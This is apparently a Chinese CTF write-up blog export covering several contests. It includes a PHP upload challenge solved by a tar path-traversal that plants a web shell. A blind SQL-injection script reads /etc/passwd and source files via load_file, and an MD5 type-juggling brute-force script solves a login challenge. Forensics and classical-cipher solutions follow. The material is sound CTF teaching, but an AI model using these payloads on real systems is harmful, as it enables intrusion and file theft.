<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;&lt;/title&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span> /&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">  &lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">   &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;filename:&lt;/label&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">$upload = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&quot;shuyu&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($upload);</span><br><span class="line">file_put_contents($upload.<span class="string">&#x27;/index.html&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">  $allow_type=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line">  $fileext = substr(strrchr($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">204800</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $filename=addslashes($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    $sql=<span class="string">&quot;insert into img (filename) values (&#x27;<span class="subst">$filename</span>&#x27;)&quot;</span>;</span><br><span class="line">    $conn-&gt;query($sql);</span><br><span class="line">    $sql=<span class="string">&quot;select id from img where filename=&#x27;<span class="subst">$filename</span>&#x27;&quot;</span>;</span><br><span class="line">    $result=$conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $id=$row[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],$upload.<span class="string">&#x27;/&#x27;</span>.$filename);</span><br><span class="line">      header(<span class="string">&quot;Location: index.php?id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  $id=addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">  $sql=<span class="string">&quot;select filename from img where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">  $result=$conn-&gt;query($sql);</span><br><span class="line">  <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">      $filename=$row[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $img=$upload.<span class="string">&#x27;/&#x27;</span>.$filename;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;<span class="subst">$img</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit1&#x27;</span>])) &#123;</span><br><span class="line">  $allow_type=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line">  $fileext = substr(strrchr($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">204800</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $filename=addslashes($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],$upload.<span class="string">&#x27;/&#x27;</span>.$filename);</span><br><span class="line">    @exec(<span class="string">&quot;cd /tmp&amp;&amp;python3 /tar.py &quot;</span>.escapeshellarg(<span class="string">&#x27;/var/www/html/&#x27;</span>.$upload.<span class="string">&#x27;/&#x27;</span>.$filename));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">      background:url(./back.jpg)  no-repeat right <span class="number">-160</span>px  ;</span><br><span class="line">      background-size:<span class="number">90</span>%;</span><br><span class="line">      background-attachment:fixed;</span><br><span class="line">      background-color: rgba(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>然后在index.php里面可以发现在根目录有<code>tar.py</code>，继续读取出来。</p>
<p><code>tar.py</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tarfile</span><br><span class="line">import sys</span><br><span class="line">tar &#x3D; tarfile.open(sys.argv[1],&quot;r&quot;)</span><br><span class="line">tar.extractall()</span><br></pre></td></tr></table></figure>

<p>很明显这是个解压文件的代码，根据题目的提示目录穿越。</p>
<p>在shell.php里面写入一句话木马，然后我们在本地压缩一个tar文件并加上目录穿越的路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf kawhi.tar ..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114113110315.png" alt="image-20201114113110315"></p>
<p>然后上传，在upload目录即可Getshell。</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114113155483.png" alt="image-20201114113155483"></p>
<p>连上蚁剑，最后在根目录下执行/readflag即可</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114112544006.png" alt="image-20201114112544006"></p>
<p>最后贴一下跑文件内容的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">pay</span>):</span></span><br><span class="line">	url = <span class="string">&quot;http://122.112.249.228:10080/index.php/?id=1+and+&quot;</span></span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30000</span>):</span><br><span class="line">		high = <span class="number">127</span></span><br><span class="line">		low = <span class="number">32</span></span><br><span class="line">		mid = (low + high) / <span class="number">2</span></span><br><span class="line">		<span class="keyword">while</span> high &gt; low:</span><br><span class="line">			payload = <span class="string">&quot;if(ascii(substr(&quot;</span>+pay+<span class="string">&quot;,%d,1))&gt;%d,1,0)%%23&quot;</span>%(i,mid)</span><br><span class="line">			<span class="comment"># print(url+payload)</span></span><br><span class="line">			response = requests.get(url+payload)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;upload&quot;</span> <span class="keyword">in</span> response.text :</span><br><span class="line">				low = mid + <span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				high = mid</span><br><span class="line"></span><br><span class="line">			mid = (low + high) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">		result += chr(int(mid))</span><br><span class="line">		print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pay = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;database:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br><span class="line"><span class="comment"># pay = &#x27;(union select load_file(0x2f6574632f706173737764))&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;/etc/passwd:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br><span class="line"><span class="comment"># pay = &#x27;(union select load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;/var/www/html/index.php:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br><span class="line"><span class="comment"># pay = &#x27;(union select load_file(0x2f7461722e7079))&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;/tar.py:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br></pre></td></tr></table></figure>

<h3 id="ezMd5"><a href="#ezMd5" class="headerlink" title="ezMd5"></a>ezMd5</h3><p>首先F12之后看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;后宫管理系统登录&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form name=<span class="string">&quot;login&quot;</span> action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;p&gt;用户名&lt;input type=text name=<span class="string">&quot;name&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;密 码&lt;input type=password name=<span class="string">&quot;password&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"> &lt;!-- </span><br><span class="line">$result = @auth($username,$password);</span><br><span class="line"><span class="keyword">if</span> (md5($username) == md5($result)  <span class="keyword">and</span> $result !== $username)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;bingo : &lt;b&gt;<span class="subst">$flag</span>&lt;/b&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>关键提示如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = @auth($username,$password);</span><br><span class="line"><span class="keyword">if</span> (md5($username) == md5($result)  <span class="keyword">and</span> $result !== $username)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;bingo : &lt;b&gt;<span class="subst">$flag</span>&lt;/b&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只要符合这个<code>if</code>的条件就可以打印出flag了</p>
<p>这里可以给username赋值一个数值md5加密后是0e开头的，然后去爆破password的值，使得result的MD5值和username的MD5相等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://122.112.253.121:10032/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    password = <span class="string">&#x27;b&#x27;</span> * i + <span class="string">&#x27;QNKCDZO&#x27;</span></span><br><span class="line">    payload = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;240610708&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: password&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.request(<span class="string">&quot;POST&quot;</span>, url, data=payload)</span><br><span class="line">    <span class="keyword">if</span> response.text.find(<span class="string">&#x27;flag&#123;&#x27;</span>) != <span class="number">-1</span>:</span><br><span class="line">        print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114122758555.png" alt="image-20201114122758555"></p>
<p>虽然可以用这种方法做，但是感觉可能是非预期，但是本次比赛我并没有找到web的官方wp，也就不知道预期解是什么了。</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><p>hint：希尔密码-&gt;rabbit</p>
<p>首先题目给了一个压缩包：715e25aec2a24ac79ab6e74497cafb80.zip</p>
<p>直接解压的话会报错文件损坏，拉进010编辑器发现伪加密，把这个地方由09改为00</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165116000.png" alt="image-20201114165116000"></p>
<p>然后再解压发现解压出两个文件分别为：<code>fun.zip</code>，<code>omisc.docx</code></p>
<p>打开<code>omisc.docx</code></p>
<p>一般来说word文档先考虑下有没有隐藏文字，于是我们在选项中把隐藏文字打开</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165628922.png" alt="image-20201114165628922"></p>
<p>然后发现多了如下两行</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165716474.png" alt="image-20201114165716474"></p>
<p>发现是希尔加密，在线希尔加密地址：<a href="http://www.atoolbox.net/Tool.php?Id=914">http://www.atoolbox.net/Tool.php?Id=914</a></p>
<p>解密后发现得到love and peaceee</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165904666.png" alt="image-20201114165904666"></p>
<p>然后再用rabbit解密上面那一大段，密钥为love and peaceee</p>
<p>在线rabbit解密地址：<a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114170253089.png" alt="image-20201114170253089"></p>
<p>然后丢进CyberChef，点击小魔法棒，自动识别base32</p>
<p>CyberChef地址：<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114170704683.png" alt="image-20201114170704683"></p>
<p>然后就是很明显的Unicode编码，找个在线解密的试试看</p>
<p>在线解密Unicode地址：<a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114170852479.png" alt="image-20201114170852479"></p>
<p>熟悉的佛曰加密，在线解密地址：<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114172118786.png" alt="image-20201114172118786"></p>
<p>然后用解密的内容作为密码解压<code>fun.zip</code>，解压后得到fun.wav，拖进<code>Audicty</code>之后</p>
<p>打开频谱图即可得到flag</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114180815728.png" alt="image-20201114180815728"></p>
<h3 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h3><p>hint：问windows动态链接库管家吧，他会告诉你answer</p>
<p>题目给了一个大小差不多是1G的名为dump的文件，老ctfer一看就知道是内存取证了</p>
<p>首先探测系统版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f dump imageinfo</span><br></pre></td></tr></table></figure>

<p>最后发现探测图片有一些信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f dump --profile&#x3D;Win7SP0x86 filescan | grep -E &#39;jpg|png|jpeg|bmp|gif&#39;</span><br></pre></td></tr></table></figure>

<p>然后dump下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f dump --profile&#x3D;Win7SP0x86 dumpfiles -Q 0x000000003fdf6118 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114201513903.png" alt="image-20201114201513903"></p>
<p>打开即可发现flag</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114201746390.png" alt="image-20201114201746390"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>第三届海啸杯</title>
    <url>/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AF/</url>
    <content><![CDATA[<p>记一次广航校内的比赛，本次作为出题人，虽然只出了一道题<a id="more"></a></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h3><p>PNG高度隐藏</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119115739801.png" alt="image-20201119115739801"></p>
<h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>基于 LSB 原理图片隐写</p>
<p>使用 Stegsolve 的 Data Extract 分析，下载地址：<a href="https://share.weiyun.com/z9PBJjks">https://share.weiyun.com/z9PBJjks</a></p>
<p>加载图片，并 Data Extract 分析</p>
<p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-YQrNMwiLAMKiXyXK.png"></p>
<p>这里就分析出来一个 png 的文件。点击下方 save bin 保存为 png 文件即可。</p>
<p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-qV653B9sifbnxjyQ.png"></p>
<p>扫描二维码即可获得flag。</p>
<h3 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h3><p>直接丢kali，binwalk分离</p>
<p>最后得到一个倒过来的flag，将其颠倒得到正确的flag</p>
<h3 id="你能破解吗"><a href="#你能破解吗" class="headerlink" title="你能破解吗"></a>你能破解吗</h3><ul>
<li>hint：压缩包密码为g2mtu加四位数字</li>
</ul>
<p>这里可以使用ARCHPR压缩包破解软件</p>
<p>首先用遍历所有的密码，然后保存在1.txt字典里面</p>
<p>遍历脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; open(&#39;1.txt&#39;,&#39;w&#39;)</span><br><span class="line">for i in range(1000,9999):</span><br><span class="line">	a &#x3D; &#39;g2mtu&#39;+str(i)+&#39;\n&#39;</span><br><span class="line">	f.write(a)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>然后打开软件选择字典模式</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120006028.png" alt="image-20201119120006028"></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120028376.png" alt="image-20201119120028376"></p>
<p>解开压缩包再base64解密即可获得flag。</p>
<h3 id="disk0"><a href="#disk0" class="headerlink" title="disk0"></a>disk0</h3><p>挂载命令如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount disk0 存放的文件夹</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120750180.png" alt="image-20201119120750180"></p>
<p>一个文本文件，和一个加密过的zip，文本说密码被删除了，使用取证工具<strong>extundelete</strong>恢复一下disk0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete disk0 --restore-all</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120947921.png" alt="image-20201119120947921"></p>
<p>得到一个RECOVERED_FILES文件夹，里面file文件就是zip的密码</p>
<p>解压再修改一下图片高度即可得到flag</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="凯撒将军"><a href="#凯撒将军" class="headerlink" title="凯撒将军"></a>凯撒将军</h3><p>凯撒密码</p>
<p>加密算法：将给定的flag中的每个字符后移3位，并将偏移后的字符串base64编码</p>
<p>加密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;flag&#123;crypto_is_hxb_so_eAsy0&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">result = flag.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line">encode_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    encode_flag += chr((ord(i)+<span class="number">3</span>)%<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> encode_flag</span><br></pre></td></tr></table></figure>

<p>解密脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result=<span class="string">&quot;]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    flag += chr(ord(i)<span class="number">-3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag.decode(<span class="string">&quot;base64&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h3><p>栅栏密码</p>
<p>由于栅栏数较小，因此不给出栅栏数提示，可以用网上的栅栏密码解密或手写脚本爆破栅栏数解密</p>
<p>加密脚本:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag &#x3D; &quot;flag&#123;yo_uget_itzha_lan_good&#125;&quot;</span><br><span class="line"></span><br><span class="line">#flag&#123;yo _uget_i tzha_la n_good&#125;</span><br><span class="line"></span><br><span class="line">k &#x3D; 7 </span><br><span class="line"></span><br><span class="line">flag &#123;yo_ uget _itz ha_l an_g ood&#125;</span><br><span class="line"></span><br><span class="line">f_tn</span><br><span class="line"></span><br><span class="line">encode_flag&#x3D;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    for j in range(4):</span><br><span class="line">        encode_flag +&#x3D; flag[j*7+i]</span><br><span class="line"></span><br><span class="line">print encode_flag</span><br></pre></td></tr></table></figure>

<p>​    解密脚本:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">encode_flag &#x3D; &quot;f_tnluz_aghggeao&#123;t_oy_ldoia&#125;&quot;</span><br><span class="line"></span><br><span class="line">for k in range(1,29):</span><br><span class="line">    flag&#x3D;&quot;&quot;</span><br><span class="line">    num &#x3D; 28&#x2F;k</span><br><span class="line">    for i in range(k):</span><br><span class="line">	    for j in range(num):</span><br><span class="line">		    flag +&#x3D; encode_flag[j*k+i]</span><br><span class="line">    if &quot;flag&quot; in flag:</span><br><span class="line">        print &quot;k:&quot;+str(28&#x2F;k)+&quot;\n&quot;+&quot;flag:\n&quot;+flag+&quot;\n&quot;</span><br></pre></td></tr></table></figure>

<h3 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h3><p>描述：</p>
<p>我军成功捣毁敌军秘密电台缴获密文和明文一份，但是还有一份密文难以破解特请你来破译密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密文：</span><br><span class="line">jivsyisgmlirgbggvuocevsivnsoevszotfloymivnmozwgitmbyfevtgugvffecgmflgtglimbggvjgmmuocevsivnijofcotgsoevsklgvflgkotjnkimmfejjhohyjifgnbwlyvfgtsiflgtgtmmcijjfeslfjwqvefstoyhmngrgjohgnflgetokvhiffgtvmozmhggulevnghgvngvfozgiuloflgtmocgjivsyisggdhgtfmbgjegrgflifwgitmisoklgvflgkotjnlinxymfzergfofgvcejjeovhgohjgflgwmhoqghgtlihmjivsyisgmbgfkggvflgcmoovizfgtkitnmcivwozflomghgohjgmfitfgnmgffjevsnokvfobguocgzitcgtmivnflgetjivsyisgmfoobguicgcotgmgffjgnivnzgkgtevvycbgtevtgugvfugvfytegmftingevnymfteijemifeovflgngrgjohcgvfozflgvifeovmfifgivnflgmhtginozyvergtmijuochyjmotwgnyuifeovgmhgueijjwsjobijemifeovivnbgffgtuoccyveuifeovmevflghimfzgknguingmijjlirguiymgncivwjivsyisgmfonemihhgitivnnocevivfjivsyisgmmyulimgvsjemlmhivemlivnulevgmgitgevutgimevsjwfiqevsorgtifhtgmgvfflgkotjnlimiboyfjivsyisgmflgnemftebyfeovozflgmgjivsyisgmemlysgjwyvgrgvflgsgvgtijtyjgemflifcejnpovgmlirgtgjifergjwzgkjivsyisgmozfgvmhoqgvbwcivwhgohjgklejglofkgfpovgmlirgjofmozfgvmhoqgvbwmcijjvycbgtmgytohglimovjwitoyvnjivsyisgmflgicgteuimiboyfizteuiivnimeiivnflghiuezeuhgtlihmozkleulhihyivgksyevgiijovgiuuoyvfmzotkgjjorgtflgcgneivvycbgtozmhgiqgtmemcgtgkleulfliflijzflgkotjnmjivsyisgmitgmhoqgvbwzgkgthgohjgflivflifijtginwkgjjorgtozflgfofijozjivsyisgmitgujomgfogdfevufeovkeflovjwizgkgjngtjwmhgiqgtmjgzfheuqiftivnocbymyyevuicgtoovgeslftgcievevsmhgiqgtmuleihivguoevcgdeuojehivihiulgevflgyvefgnmfifgmfkootfltggotkinxesyeviymftijeiovgkefliaygmfeovcitqvovgozflgmgmggcmfolirgcyululivugozmytrerij</span><br><span class="line">明文：</span><br><span class="line">Languages have been coming and going for thousands of years, but in recent times there has been less coming and a lot more going. When the world was still populated by hunter-gatherers，small，tightly knit(联系)groups developed their own patterns of speech independent of each other. Some language experts believe that 10,000 years ago, when the world had just five to ten million people, they spoke perhaps 12, 000 languages between them.Soon afterwards, many of those people started settling down to become farmers, and their languages too became more settled and fewer in number. In recent centuries, trade, industrialisation, the development of the nation-state and the spread of universal compulsory education, especially globalisation and better communications in the past few decades, all have caused many languages to disappear, and dominant languages such as English，Spanish and Chinese are increasingly taking over.At present, the world has about 6, 800 languages. The distribution of these languages is hugely uneven. The general rule is that mild zones have relatively few languages, often spoken by many people, while hot wet zones have lots, often spoken by small numbers. Europe has only around 200 languages; the Americas about 1, 000; Africa 2, 400; and Asia and the Pacific perhaps 3,200, of which Papua New Guinea alone accounts for well over 800.The median number(中位数) of speakers is mere 6,000, which that half the world&#39;s languages are spoken by fewer people than that.Already well over 400 of the total of 6, 800 languages are close to extinction (消亡), with only a few elderly speakers left. Pick, at random, Busuu in Cameroon （eight remaining speakers), Chiapaneco in Mexico (150), Lipan Apache in the United States (two or three) 